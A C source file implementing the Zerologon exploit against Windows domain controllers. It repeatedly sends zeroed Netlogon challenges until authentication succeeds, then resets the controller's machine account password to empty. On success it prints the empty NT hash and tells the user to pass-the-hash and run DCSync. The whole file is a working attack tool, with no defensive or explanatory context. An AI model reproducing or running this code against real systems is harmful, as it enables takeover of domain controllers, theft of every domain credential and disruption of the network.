#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>


typedef struct _NETLOGON_CREDENTIAL {
	CHAR data[8];
} NETLOGON_CREDENTIAL, * PNETLOGON_CREDENTIAL;

typedef struct _NETLOGON_AUTHENTICATOR {
	NETLOGON_CREDENTIAL Credential;
	DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, * PNETLOGON_AUTHENTICATOR;

typedef  enum _NETLOGON_SECURE_CHANNEL_TYPE {
	NullSecureChannel = 0,
	MsvApSecureChannel = 1,
	WorkstationSecureChannel = 2,
	TrustedDnsDomainSecureChannel = 3,
	TrustedDomainSecureChannel = 4,
	UasServerSecureChannel = 5,
	ServerSecureChannel = 6,
	CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;

typedef struct _NL_TRUST_PASSWORD {
	WCHAR Buffer[256];
	ULONG Length;
} NL_TRUST_PASSWORD, * PNL_TRUST_PASSWORD;


typedef NTSTATUS (WINAPI* FUNC_I_NetServerReqChallenge)(LPWSTR PrimaryName, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientChallenge, PNETLOGON_CREDENTIAL ServerChallenge);
typedef NTSTATUS (WINAPI* FUNC_I_NetServerAuthenticate2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientCredential, PNETLOGON_CREDENTIAL ServerCredential, PULONG NegotiatedFlags);
typedef NTSTATUS (WINAPI* FUNC_I_NetServerPasswordSet2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_AUTHENTICATOR Authenticator, PNETLOGON_AUTHENTICATOR ReturnAuthenticator, PNL_TRUST_PASSWORD ClearNewPassword);


int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {
	DWORD                  i;
	NETLOGON_CREDENTIAL    ClientCh = { 0 };
	NETLOGON_CREDENTIAL    ServerCh = { 0 };
	NETLOGON_AUTHENTICATOR Auth = { 0 };
	NETLOGON_AUTHENTICATOR AuthRet = { 0 };
	NL_TRUST_PASSWORD      NewPass = { 0 };
	ULONG                  NegotiateFlags = 0x212fffff;
	HMODULE				   hNetAPI = NULL;
	FUNC_I_NetServerReqChallenge I_NetServerReqChallenge = NULL;
	FUNC_I_NetServerAuthenticate2 I_NetServerAuthenticate2 = NULL;
	FUNC_I_NetServerPasswordSet2 I_NetServerPasswordSet2 = NULL;
	wchar_t* dc_fqdn;		/* DC.corp.acme.com */
	wchar_t* dc_netbios;	/* DC */
	wchar_t* dc_account;	/* DC$ */
	if (argc < 4) {
		wprintf(L"[+] Usage: %s <FQDN> <NETBIOS_NAME> <ACCOUNT_NAME>\n", argv[0]);
		wprintf(L"[+] Example: %s DC.corp.acme.com DC DC$\n", argv[0]);
		return 0;
	}
	hNetAPI = LoadLibraryW(L"netapi32.dll");
	if (hNetAPI == NULL) {
		wprintf(L"[!] LoadLibrary netapi32.dll Error.\n");
		return 0;
	}
	
	dc_fqdn = argv[1];
	dc_netbios = argv[2];
	dc_account = argv[3];
	I_NetServerReqChallenge =(FUNC_I_NetServerReqChallenge)GetProcAddress(hNetAPI, "I_NetServerReqChallenge");
	I_NetServerAuthenticate2 =(FUNC_I_NetServerAuthenticate2)GetProcAddress(hNetAPI, "I_NetServerAuthenticate2");
	I_NetServerPasswordSet2 =(FUNC_I_NetServerPasswordSet2)GetProcAddress(hNetAPI, "I_NetServerPasswordSet2");

	wprintf(L"[+] Domain Controller FQDN : %s \n", dc_fqdn);
	wprintf(L"[+] Domain Controller NetBios Name : %s \n", dc_netbios);
	wprintf(L"[+] Domain Controller Account : %s \n", dc_account);
	for (i = 0; i < 2000; i++) {
		I_NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh);
		if ((I_NetServerAuthenticate2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &ClientCh, &ServerCh, &NegotiateFlags) == 0)) {
			if (I_NetServerPasswordSet2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &Auth, &AuthRet, &NewPass) == 0) {
				wprintf(L"[+] Success! Use pth .\\%s 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcscync\n", dc_account);
				return 0;
			}
			else {
				wprintf(L"[-] Failed to set machine account pass for %s\n", dc_account);
				return 0;
			}
			return 0;
		}
	}
	wprintf(L"[-] %s is not vulnerable.....\n", dc_fqdn);
	return 0;
}

